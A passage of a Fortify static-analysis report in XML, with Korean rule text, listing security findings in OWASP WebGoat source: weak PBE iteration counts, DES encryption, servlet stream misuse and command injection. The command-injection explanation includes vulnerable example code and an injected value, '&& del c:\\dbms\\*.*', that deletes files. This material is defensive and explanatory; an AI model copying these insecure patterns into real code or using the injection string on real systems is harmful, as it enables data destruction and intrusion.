<TargetFunction>VariableAccess: id</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Weak Cryptographic Hash: Insecure PBE Iteration Count</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>암호 기반 키 파생 함수에서 사용하는 반복 횟수가 지나치게 낮습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>키 파생 함수는 기본 키와 그 밖의 매개 변수에서 키를 파생하는 데 사용됩니다. 암호 기반 키 파생 함수에서 기본 키는 암호이고 그 밖의 매개 변수는 솔트 값과 반복 횟수입니다. 반복 횟수는 전통적으로 암호에서 키를 파생하는 데 드는 비용을 높이는 데 적절히 사용되어 왔습니다. 반복 횟수가 너무 적으면 공격자가 응용 프로그램에 대한 "레인보우 테이블"을 계산하여 해시된 암호 값을 더 쉽게 확인할 수 있기 때문에 공격 가능성이 높아집니다.



예제 1: 다음 코드에서는 반복 횟수를 50으로 사용합니다.


...
final int iterationCount=50;
PBEParameterSpec pbeps=new PBEParameterSpec(salt,iterationCount);
...


암호 기반 암호화에 낮은 반복 횟수를 사용하는 응용 프로그램은 간단한 사전 기반 공격에 취약해집니다. 특히, 암호 기반 암호화 스키마를 통해 보호하도록 되어 있는 공격 유형이 여기에 해당합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>암호 기반 키 파생 함수를 사용하는 경우 반복이 최소 1,000회 이상이어야 하지만 10만 회 이상인 것이 좋습니다. 반복 횟수가 1,000회이면 개별 키를 파생하는 데 드는 비용에는 그다지 영향을 주지 않으면서 암호를 철저히 검색하는 데 드는 비용이 대폭 증가하게 됩니다. NIST SP 800-132에서는 중요한 키나 매우 강력한 시스템의 경우 10,000,000이나 되는 반복 횟수를 사용하도록 권장하고 있습니다.
반복 횟수가 1,000회 미만이면 Fortify Secure Coding Rulepacks는 더 심각한 이슈를 보고하며, 반복 횟수가 1,000회에서 10만 회 사이이면 낮은 심각도의 이슈를 보고합니다. 소스 코드가 반복을 10만 회 이상 사용하는 경우에는 이슈가 보고되지 않습니다.

예제 2: 다음 코드에서는 반복 횟수를 100,000으로 사용합니다.


...
final int iterationCount=100000;
PBEParameterSpec pbeps=new PBEParameterSpec(salt,iterationCount);
...
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>4</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="76F83F7F586982395D3369DC6BF4F293" ruleID="E36939CF-1ED1-447A-9FE2-F67BEA4386E6">
                            <Category>Weak Cryptographic Hash: Insecure PBE Iteration Count</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 기반 키 파생 함수에서 사용하는 반복 횟수가 지나치게 낮습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>487</LineStart>
<Snippet>		{

			PBEParameterSpec ps = new javax.crypto.spec.PBEParameterSpec( salt, 20 );

			SecretKeyFactory kf = SecretKeyFactory.getInstance( "PBEWithMD5AndDES" );</Snippet>
<TargetFunction>PBEParameterSpec()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3F04FAE769A4DDF255BE805DC7914D4B" ruleID="E36939CF-1ED1-447A-9FE2-F67BEA4386E6">
                            <Category>Weak Cryptographic Hash: Insecure PBE Iteration Count</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 기반 키 파생 함수에서 사용하는 반복 횟수가 지나치게 낮습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>531</LineStart>
<Snippet>		{

			PBEParameterSpec ps = new javax.crypto.spec.PBEParameterSpec( salt, 20 );

			SecretKeyFactory kf = SecretKeyFactory.getInstance( "PBEWithMD5AndDES" );</Snippet>
<TargetFunction>PBEParameterSpec()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="34816573F2EED5813D3AC2F5DC458AD8" ruleID="E2CD26BB-EEF7-4D13-91CC-2F22278FE7C3">
                            <Category>Weak Cryptographic Hash: Insecure PBE Iteration Count</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 기반 키 파생 함수에서 사용하는 반복 횟수가 지나치게 낮습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>539</LineStart>
<Snippet>			char[] pass = pw.toCharArray();

			SecretKey k = kf.generateSecret( new javax.crypto.spec.PBEKeySpec( pass ) );

			passwordEncryptCipher.init( Cipher.ENCRYPT_MODE, k, ps );</Snippet>
<TargetFunction>PBEKeySpec()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CCDBEBDCA8529B6562555BA1325C6E08" ruleID="E2CD26BB-EEF7-4D13-91CC-2F22278FE7C3">
                            <Category>Weak Cryptographic Hash: Insecure PBE Iteration Count</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 기반 키 파생 함수에서 사용하는 반복 횟수가 지나치게 낮습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>495</LineStart>
<Snippet>			char[] pass = pw.toCharArray();

			SecretKey k = kf.generateSecret( new javax.crypto.spec.PBEKeySpec( pass ) );

			passwordDecryptCipher.init( Cipher.DECRYPT_MODE, k, ps );</Snippet>
<TargetFunction>PBEKeySpec()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Weak Encryption</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Encoding.java의 489 줄에서 getInstance()에 대한 호출은 민감한 데이터의 기밀성을 보장할 수 없는 약한 암호화 알고리즘을 사용합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>DES와 같은 오래된 암호화 알고리즘은 더 이상 민감한 데이터와 함께 사용할 충분한 기능을 제공하지 않습니다. 암호화 알고리즘은 암호화 능력을 보장하는 기본 메커니즘 중 하나로 키 크기에 의존합니다. 암호화 능력은 흔히 유효한 키를 생성하는 데 필요한 계산 능력 및 시간으로 측정됩니다. 계산 기능의 발전으로 인해 적당한 시간에 작은 암호화 키를 얻을 수 있게 되었습니다. 예를 들어, DES에 사용되는 56비트 키는 알고리즘이 처음 개발된 1970년대에는 상당한 계산상의 장애물을 내포했지만 오늘날 DES는 일반적으로 사용 가능한 장비를 사용하여 하루도 안 돼 균열될 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>키 크기가 큰 강력한 암호화 알고리즘을 사용하여 민감한 데이터를 보호하십시오. DES에 대한 강력한 대인은 AES(Advanced Encryption Standard, 이전의 Rijndael)입니다. 알고리즘을 선택하기 전에 먼저 조직이 특정 알고리즘 및 구현에서 표준화되었는지 확인합니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>4</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="8703C5DCE8BC7D1128B656E2516864AA" ruleID="925A2CD9-F518-4500-B94C-34126420D183">
                            <Category>Weak Encryption</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Encoding.java의 535 줄에서 getInstance()에 대한 호출은 민감한 데이터의 기밀성을 보장할 수 없는 약한 암호화 알고리즘을 사용합니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>535</LineStart>
<Snippet>			SecretKeyFactory kf = SecretKeyFactory.getInstance( "PBEWithMD5AndDES" );

			Cipher passwordEncryptCipher = Cipher.getInstance( "PBEWithMD5AndDES/CBC/PKCS5Padding" );

			char[] pass = pw.toCharArray();</Snippet>
<TargetFunction>getInstance()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="348DE279CA4677D539557F0772DC215F" ruleID="925A2CD9-F518-4500-B94C-34126420D183">
                            <Category>Weak Encryption</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Encoding.java의 491 줄에서 getInstance()에 대한 호출은 민감한 데이터의 기밀성을 보장할 수 없는 약한 암호화 알고리즘을 사용합니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>491</LineStart>
<Snippet>			SecretKeyFactory kf = SecretKeyFactory.getInstance( "PBEWithMD5AndDES" );

			Cipher passwordDecryptCipher = Cipher.getInstance( "PBEWithMD5AndDES/CBC/PKCS5Padding" );

			char[] pass = pw.toCharArray();</Snippet>
<TargetFunction>getInstance()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="80F4A07EEEB4A2FFE6B25E72C01862B9" ruleID="4FCC2666-0044-495B-AFBE-CE1160414EEB">
                            <Category>Weak Encryption</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Encoding.java의 533 줄에서 getInstance()에 대한 호출은 민감한 데이터의 기밀성을 보장할 수 없는 약한 암호화 알고리즘을 사용합니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>533</LineStart>
<Snippet>			PBEParameterSpec ps = new javax.crypto.spec.PBEParameterSpec( salt, 20 );

			SecretKeyFactory kf = SecretKeyFactory.getInstance( "PBEWithMD5AndDES" );

			Cipher passwordEncryptCipher = Cipher.getInstance( "PBEWithMD5AndDES/CBC/PKCS5Padding" );</Snippet>
<TargetFunction>getInstance()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1D385E28C2D8A9E9F68F0AB8888B5EDF" ruleID="4FCC2666-0044-495B-AFBE-CE1160414EEB">
                            <Category>Weak Encryption</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Encoding.java의 489 줄에서 getInstance()에 대한 호출은 민감한 데이터의 기밀성을 보장할 수 없는 약한 암호화 알고리즘을 사용합니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>489</LineStart>
<Snippet>			PBEParameterSpec ps = new javax.crypto.spec.PBEParameterSpec( salt, 20 );

			SecretKeyFactory kf = SecretKeyFactory.getInstance( "PBEWithMD5AndDES" );

			Cipher passwordDecryptCipher = Cipher.getInstance( "PBEWithMD5AndDES/CBC/PKCS5Padding" );</Snippet>
<TargetFunction>getInstance()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Code Correctness: Multiple Stream Commits</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>HammerHead.java의 187 줄에서 &lt;a href="location://JavaSource/org/owasp/webgoat/HammerHead.java###187###59###0"&gt;forward()&lt;/a&gt; 메서드는 스트림이 이미 커밋되었거나 확보되고 난 후 호출됩니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>HttpServletRequest을 전달하거나, HttpServletResponse를 리디렉션하거나 서블릿의 출력 스트림 버퍼를 플러시하면 연결된 스트림이 커밋됩니다. 추가 플러시 또는 리디렉션 등, 이어지는 버퍼 재설정 또는 스트림 커밋은 IllegalStateException으로 이어질 수 있습니다.

또한 Java 서블릿을 사용하면 ServletOutputStream 또는 PrintWriter 중 하나를 사용하여(두 가지 모두는 안 됨) 응답 스트림에 데이터를 쓸 수 있습니다. getOutputStream()을 호출한 후 getWriter()를 호출하거나 또는 그 반대의 경우에도 IllegalStateException이 발생합니다.



런타임 시, IllegalStateException은 응답 핸들러가 실행 완료되는 것을 막아 응답을 취소합니다. 이로 인해 서버 불안정이 발생할 수 있는데, 이는 서블릿이 잘못 구현되었다는 의미입니다.

예제 1: 다음 코드는 해당 출력 스트림 버퍼가 플러시되고 나면 서블릿 응답을 리디렉션합니다.

public class RedirectServlet extends HttpServlet {
    public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {
        ...
        OutputStream out = res.getOutputStream();
        ...
        // flushes, and thereby commits, the output stream
        out.flush();
        out.close();        // redirecting the response causes an IllegalStateException
        res.sendRedirect("http://www.acme.com");
    }
}


예제 2: 반대로 다음 코드는 요청이 전달되고 나면 PrintWriter의 버퍼에 쓰거나 플러시를 시도합니다.

public class FlushServlet extends HttpServlet {
    public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {
        ...
        // forwards the request, implicitly committing the stream
        getServletConfig().getServletContext().getRequestDispatcher("/jsp/boom.jsp").forward(req, res);
        ...

        // IllegalStateException; cannot redirect after forwarding
        res.sendRedirect("http://www.acme.com/jsp/boomboom.jsp");

        PrintWriter out = res.getWriter();

        // writing to an already-committed stream will not cause an exception,
        // but will not apply these changes to the final output, either
        out.print("Writing here does nothing");

        // IllegalStateException; cannot flush a response's buffer after forwarding the request
        out.flush();
        out.close();
    }
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>커밋되고 나면 스트림에 더 이상 변경 사항이 없는지 확인하십시오. 스트림에 더 이상 작성하는 것은 의미가 없으며 추가 커밋으로 인해 
서블릿에서 IllegalStateException이 발생할 수 있습니다. 가능하면 이러한 지침을 준수하는 것이 좋습니다.

1. forward() 또는 sendRedirect 후 즉시 복귀하십시오.
2. ServletResponse.getWriter() 또는 ServletResponse.getOuputStream() 호출 후에는 forward() 또는 sendRedirect()를 호출하지 마십시오.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="31ED40444F5744E2D3C71687E8F6619E" ruleID="2920248A-E5CA-4446-B269-A541CD7FBCFA">
                            <Category>Code Correctness: Multiple Stream Commits</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>HammerHead.java의 200 줄에서 &lt;a href="location://JavaSource/org/owasp/webgoat/HammerHead.java###200###8###0"&gt;writeScreen()&lt;/a&gt; 메서드는 스트림이 이미 커밋되었거나 확보되고 난 후 호출됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>200</LineStart>
<Snippet>	    try
	    {
		this.writeScreen(screen, response);
	    }
	    catch (Throwable thr)</Snippet>
<TargetFunction>?.writeScreen(?, response)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B627A89B5E3F7A38D81F7B1DC1541966" ruleID="2920248A-E5CA-4446-B269-A541CD7FBCFA">
                            <Category>Code Correctness: Multiple Stream Commits</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>LessonSource.java의 100 줄에서 &lt;a href="location://JavaSource/org/owasp/webgoat/LessonSource.java###100###8###0"&gt;writeSource()&lt;/a&gt; 메서드는 스트림이 이미 커밋되었거나 확보되고 난 후 호출됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonSource.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/LessonSource.java</FilePath>
<LineStart>100</LineStart>
<Snippet>	    try
	    {
		this.writeSource(source, response);
	    }
	    catch (Throwable thr)</Snippet>
<TargetFunction>?.writeSource(?, response)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8023503AE57B843EDD726F7055D9D14E" ruleID="2920248A-E5CA-4446-B269-A541CD7FBCFA">
                            <Category>Code Correctness: Multiple Stream Commits</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>HammerHead.java의 187 줄에서 &lt;a href="location://JavaSource/org/owasp/webgoat/HammerHead.java###187###59###0"&gt;forward()&lt;/a&gt; 메서드는 스트림이 이미 커밋되었거나 확보되고 난 후 호출됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>187</LineStart>
<Snippet>	    request.getSession().setAttribute("course", mySession.getCourse());

	    request.getRequestDispatcher(getViewPage(mySession)).forward(
		    request, response);
	}</Snippet>
<TargetFunction>forward(?, response)</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Command Injection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>WSDLScanning.java의 accessWGService() 메서드는 신뢰할 수 없는 데이터에서 만들어진 명령을 사용하여 setOperationName()을(를) 호출합니다. 이 호출로 인해 프로그램이 공격자 대신 악의적인 명령을 실행할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Command injection 취약점은 두 가지 형태로 나타납니다.

- 공격자가 프로그램이 실행하는 명령을 변경합니다. 공격자가 명시적으로 명령 부분을 제어합니다.

- 공격자가 프로그램이 실행되는 환경을 변경합니다. 공격자가 암시적으로 명령의 의미를 제어합니다.

이 경우에는 주로 공격자가 실행 명령을 제어할 수 있는 첫 번째 시나리오를 집중적으로 살펴보겠습니다. 이런 종류의 command injection 취약점은 다음 경우에 발생합니다.

1. 신뢰할 수 없는 소스에서 데이터가 응용 프로그램에 입력됩니다.


2. 데이터는 응용 프로그램이 실행하는 명령을 나타내는 문자열 또는 문자열의 일부로 사용됩니다. 

3. 응용 프로그램은 명령을 실행하여 공격자에게 공격자가 다른 방법으로는 얻을 수 없는 권한 또는 기능을 부여합니다. 

예제 1: 다음 시스템 유틸리티 코드는 시스템 속성 APPHOME을 사용하여 코드가 설치되는 디렉터리를 결정한 다음 특정 디렉터리에서 상대 경로를 사용하여 초기화 스크립트를 실행합니다.


	...
	String home = System.getProperty("APPHOME");
	String cmd = home + INITCMD;
	java.lang.Runtime.getRuntime().exec(cmd);
	...


Example 1의 코드는 시스템 속성 APPHOME을 INITCMD의 악성 버전이 들어 있는 다른 경로를 가리키도록 수정하기 때문에 공격자가 응용 프로그램에 대한 높은 권한으로 임의의 명령을 실행할 수 있습니다. 프로그램이 환경에서 읽은 값을 확인하지 않기 때문에, 공격자가 시스템 속성 APPHOME의 값을 제어할 수 있는 경우 응용 프로그램을 조작하여 악성 코드를 실행하게 하고 시스템을 제어할 수 있습니다.

예제 2: 다음 코드는 사용자가 rman 유틸리티 주위에서 배치 파일 래퍼를 사용하여 Oracle 데이터베이스의 백업을 시작한 다음 cleanup.bat 스크립트를 실행하여 여러 임시 파일을 삭제하도록 설계된 관리 웹 응용 프로그램에서 온 것입니다. 스크립트 rmanDB.bat는 수행할 백업의 유형을 지정하는 하나의 명령줄 매개 변수를 사용합니다. 데이터베이스에 대한 접근이 제한되어 있기 때문에 응용 프로그램은 권한 있는 사용자로 백업을 실행합니다.


...
String btype = request.getParameter("backuptype");
String cmd = new String("cmd.exe /K
\"c:\\util\\rmanDB.bat "+btype+"&amp;&amp;c:\\util\\cleanup.bat\"")
System.Runtime.getRuntime().exec(cmd);
...


이때 문제는 사용자로부터 읽어들인 backuptype 매개 변수를 프로그램이 검증하지 않는다는 점입니다. 일반적으로 Runtime.exec() 함수는 여러 명령을 실행하지 않지만 이 경우에는 프로그램이 먼저 Runtime.exec()에 대한 단일 호출을 사용하여 여러 명령을 실행하기 위해 cmd.exe 셸을 실행합니다. 셸을 호출하면 두 개의 앰퍼샌드로 구분된 여러 명령 실행이 허용됩니다. 공격자가 "&amp;&amp; del c:\\dbms\\*.*" 형식의 문자열을 전달하면 응용 프로그램은 프로그램에서 지정한 기타 명령과 함께 이 명령을 실행합니다. 응용 프로그램의 속성 때문에 응용 프로그램은 데이터베이스와 상호 작용하는 데 필요한 권한으로 실행됩니다. 즉, 공격자가 어떤 명령을 삽입해도 이 권한으로 실행합니다.

예제 3: 다음 코드는 사용자가 시스템의 암호를 업데이트할 수 있는 인터페이스를 제공하는 웹 응용 프로그램의 일부입니다. 특정 네트워크 환경에서 암호를 업데이트하는 프로세스의 일부는 /var/yp 디렉터리에서 make 명령을 실행하는 것입니다.


...
System.Runtime.getRuntime().exec("make");
...


여기서 문제는 프로그램이 make의 절대 경로를 지정하지 않아 Runtime.exec() 호출을 실행하기 전에 실행 환경이 정리되지 않는다는 점입니다. 공격자가 $PATH 변수를 수정하여 make라는 악성 이진 파일을 가리키도록 하고 프로그램이 환경에서 실행되도록 하면 원하는 파일 대신 악성 이진 파일이 로드됩니다. 응용 프로그램은 그 속성 때문에 시스템 작업을 수행하는 데 필요한 권한으로 실행됩니다. 즉, 공격자의 make는 이 권한으로 실행되어 공격자에게 시스템의 완전한 제어권을 넘겨줄 수 있습니다.

모바일 환경에서는 command injection과 같은 전형적인 취약점이 발생하지 않는다고 생각하는 사용자도 있습니다. 자기 자신을 공격하는 사용자는 없을 것이라 여기기 때문입니다. 그러나 모바일 플랫폼의 핵심 요소는 다양한 소스에서 다운로드되어 같은 장치에서 함께 실행되는 응용 프로그램이라는 점을 유념해야 합니다. 즉 금융 응용 프로그램과 맬웨어를 함께 실행할 가능성이 높으므로 프로세스 간 통신을 포함하도록 모바일 응용 프로그램의 공격 표면을 확장해야 합니다.

예제 4: 다음 코드는 Android 인텐트에서 실행할 명령을 읽습니다.


...
        String[] cmds = this.getIntent().getStringArrayExtra("commands");
        Process p = Runtime.getRuntime().exec("su");
        DataOutputStream os = new DataOutputStream(p.getOutputStream());
        for (String cmd : cmds) {
                os.writeBytes(cmd+"\n");
        }
        os.writeBytes("exit\n");
        os.flush();
...


루팅된 장치에서 악성 응용 프로그램은 공격 대상 응용 프로그램이 수퍼 사용자 권한을 사용하여 임의의 명령을 실행하도록 강제 지정할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>사용자가 프로그램이 실행하는 명령을 직접 제어하도록 허용해서는 안 됩니다. 실행될 명령에 사용자 입력을 적용해야 하는 경우, 사용자 입력은 미리 결정된 안전한 명령 집합에서 명령을 선택하는 데만 사용합니다. 입력이 악성으로 의심될 경우, 명령 실행 함수에 전달되는 값이 기본적으로 안전한 명령 집합에서 선택한 값이 되거나 프로그램이 아무런 명령을 실행하지 않도록 해야 합니다. 

이 접근 방식은 사용자 입력을 프로그램이 실행하는 명령의 인수로 사용해야 하는 경우, 올바른 인수 값 집합이 너무 크거나 추적이 어렵기 때문에 현실성이 없습니다. 이런 상황에서 개발자는 흔히 거부 목록을 구현합니다. 거부 목록은 입력을 사용하기 전에 위험한 문자를 선별적으로 거부하거나 이스케이프 처리하는 데 사용됩니다. 안전하지 않은 문자 목록은 완전하지 않을 가능성이 크고 명령을 실행하는 시스템에 따라 크게 달라집니다. 효율적인 접근 방식은 입력에 사용할 수 있는 문자의 목록을 만들어 허용 목록에 있는 문자만으로 이루어진 입력만 받는 것입니다.

공격자는 명령이 실행되는 환경을 수정하여 프로그램이 실행하는 명령을 간접적으로 제어할 수 있습니다. 실행 환경을 신뢰할 수 없으므로 공격자가 환경을 조작하여 공격을 가하는 것을 막기 위한 예방 조치를 취해야 합니다. 가급적이면 명령은 응용 프로그램에서 제어해야 하고 절대 경로를 사용하여 실행해야 합니다. 교차 플랫폼 응용 프로그램의 경우와 같이 컴파일 시 경로를 알 수 없는 경우, 실행 도중 신뢰할 수 있는 값으로 절대 경로를 만들어야 합니다. 구성 파일 또는 환경에서 읽은 명령 값 및 경로를 올바른 값을 정의해 놓은 고정 값 집합과 대조하는 안전 검사를 수행해야 합니다.

이 소스가 조작된 것인지 밝히기 위한 검사도 수행할 수 있습니다. 예를 들어, 구성 파일이 누구나 쓸 수 있는(world-writable) 파일인 경우 프로그램이 실행을 거부할 수 있습니다. 실행할 이진 파일에 대한 정보를 사전에 알고 있으면 프로그램이 이진 파일의 ID를 확인하기 위한 검사를 실시할 수 있습니다. 이진 파일을 항상 특정 사용자가 소유해야 하거나 파일에 특정 접근 권한 집합을 지정해야 하는 경우, 파일을 실행하기 전에 이런 속성을 프로그래밍 방식으로 확인할 수 있습니다.

프로그램이 실행하는 명령의 제어권을 노리는 가상의 공격자로부터 프로그램을 완벽하게 보호할 수는 없지만 프로그램이 외부 명령을 실행할 때마다 반드시 최소 권한 원칙을 적용해야 합니다. 명령 실행에 필수적이지 않은 권한은 유지하지 않아야 합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 많은 최신 웹 프레임워크는 사용자 입력의 검증을 수행하기 위한 메커니즘을 제공합니다(Struts 및 Spring MVC 포함). 확인되지 않은 입력의 소스를 강조하기 위해, Fortify 보안 코딩 규칙 팩은 악용 가능성을 낮추고 프레임워크 검증 메커니즘이 사용 중일 때마다 지원하는 증거에 포인터를 제공하여 Fortify Static Code Analyzer에서 보고한 문제의 우선 순위를 동적으로 재지정합니다. 이 기능을 Context-Sensitive Ranking(컨텍스트 감지 순위)이라고 부릅니다. Fortify 사용자의 감사 프로세스를 지원하기 위해, Fortify Software Security Research Group은 입력 소스에 적용된 검증 메커니즘에 따라 문제를 폴더로 그룹화하는 데이터 유효성 프로젝트 템플릿을 사용 가능하게 만듭니다.

2. Fortify AppDefender adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="1EE43C8EBD079E2A1595DC2E202F0C99" ruleID="5760613C-9AF8-41EF-8431-66B6FBD4717A">
                            <Category>Command Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
